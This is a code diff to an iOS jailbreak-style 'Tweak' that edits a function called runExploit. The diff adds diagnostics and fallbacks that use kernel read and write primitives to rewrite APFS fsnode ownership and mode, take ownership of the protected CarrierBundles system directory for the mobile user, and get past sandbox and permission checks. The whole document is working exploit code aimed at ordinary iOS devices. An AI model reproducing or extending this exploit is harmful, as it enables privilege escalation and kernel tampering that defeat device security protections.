@@ -4,6 +4,7 @@
 #import <objc/message.h>
 #import <xpc/xpc.h>
 #include <sys/stat.h>
+#include <stddef.h>
 #include <limits.h>
 #include <unistd.h>
 
@@ -767,12 +768,55 @@ static void runExploit(void) {
         unlink(testPath);
         NSLog(@"[Tweak] *** CarrierBundles write access VERIFIED ***");
     } else {
+        int write_errno = errno;
         NSLog(@"[Tweak] *** CarrierBundles write access FAILED (errno=%d: %s) *** "
               "uid=%d euid=%d gid=%d egid=%d",
-              errno, strerror(errno), getuid(), geteuid(), getgid(), getegid());
+              write_errno, strerror(write_errno), getuid(), geteuid(), getgid(), getegid());
+
+        // Diagnostic: check if the issue is sandbox (EACCES) or read-only fs (EROFS)
+        if (write_errno == EACCES) {
+            NSLog(@"[Tweak] errno=EACCES -> sandbox or DAC is still blocking writes");
+        } else if (write_errno == EROFS) {
+            NSLog(@"[Tweak] errno=EROFS -> filesystem is read-only (sealed snapshot?)");
+        } else if (write_errno == EPERM) {
+            NSLog(@"[Tweak] errno=EPERM -> operation not permitted (AMFI?)");
+        }
+
+        // Diagnostic: verify kernel state of root directory
+        {
+            struct stat diagStat;
+            if (stat(cbPath, &diagStat) == 0) {
+                NSLog(@"[Tweak] Root dir stat: uid=%u gid=%u mode=0%o",
+                      diagStat.st_uid, diagStat.st_gid, diagStat.st_mode & 0xFFFF);
+                if (diagStat.st_uid != 501 || (diagStat.st_mode & 0200) == 0) {
+                    NSLog(@"[Tweak] Root dir NOT owned by mobile or lacks owner write bit!");
+                }
+            } else {
+                NSLog(@"[Tweak] Cannot stat CarrierBundles (errno=%d)", errno);
+            }
+
+            // Kernel-level read of fsnode to verify actual on-disk state
+            uint64_t diag_vnode = get_vnode_for_path_kernel(cbPath);
+            if (diag_vnode != (uint64_t)-1 && diag_vnode != 0) {
+                uint64_t diag_fs = kread64(diag_vnode + off_vnode_v_data);
+                if (diag_fs) {
+                    uint32_t k_uid = kread32(diag_fs + offsetof(struct apfs_fsnode, uid));
+                    uint16_t k_mode = kread16(diag_fs + offsetof(struct apfs_fsnode, mode));
+                    NSLog(@"[Tweak] Kernel fsnode: uid=%u mode=0%o", k_uid, k_mode);
+                    if (k_uid != 501 || (k_mode & 0200) == 0) {
+                        NSLog(@"[Tweak] FS node not correctly set! Forcing direct kernel write...");
+                        apfs_own_vnode(diag_vnode, 501, 501);
+                        sync();
+                        // Re-check
+                        k_uid = kread32(diag_fs + offsetof(struct apfs_fsnode, uid));
+                        k_mode = kread16(diag_fs + offsetof(struct apfs_fsnode, mode));
+                        NSLog(@"[Tweak] After force-write: uid=%u mode=0%o", k_uid, k_mode);
+                    }
+                }
+            }
+        }
+
         // Final fallback: kernel-level path resolution + kernel walk
-        // get_vnode_for_path_kernel bypasses DAC entirely, unlike
-        // get_vnode_for_path_by_chdir/open which fail on restricted paths.
         {
             uint64_t rv = get_vnode_for_path_kernel(cbPath);
             if (rv != (uint64_t)-1 && rv != 0) {
@@ -781,17 +825,23 @@ static void runExploit(void) {
                 if (pd) { struct dirent *de; while ((de = readdir(pd)) != NULL) {} closedir(pd); }
                 long kn = apfs_own_tree_kernel(cbPath, 501, 501);
                 NSLog(@"[Tweak] Final fallback kernel walk: %ld entries", kn);
+
+                // Try writing again with O_RDWR | O_CREAT
+                tf = open(testPath, O_RDWR | O_CREAT | O_TRUNC, 0644);
+                if (tf >= 0) {
+                    close(tf); unlink(testPath);
+                    NSLog(@"[Tweak] *** CarrierBundles write access VERIFIED after kernel fallback ***");
+                } else {
+                    int final_errno = errno;
+                    NSLog(@"[Tweak] *** CarrierBundles STILL not writable after all fallbacks "
+                          "(errno=%d: %s) ***", final_errno, strerror(final_errno));
+                    NSLog(@"[Tweak] This usually means the rootfs is on a sealed snapshot.");
+                    NSLog(@"[Tweak] On iOS 17+ with snapshots, writes go to the data partition,");
+                    NSLog(@"[Tweak] not the actual CarrierBundles directory.");
+                }
             } else {
                 NSLog(@"[Tweak] Final fallback: get_vnode_for_path_kernel also failed");
             }
-        }
-
-        tf = open(testPath, O_WRONLY | O_CREAT | O_TRUNC, 0644);
-        if (tf >= 0) {
-            close(tf); unlink(testPath);
-            NSLog(@"[Tweak] *** CarrierBundles write access VERIFIED after kernel fallback ***");
-        } else {
-            NSLog(@"[Tweak] *** CarrierBundles STILL not writable after all fallbacks ***");
         }
     }
 
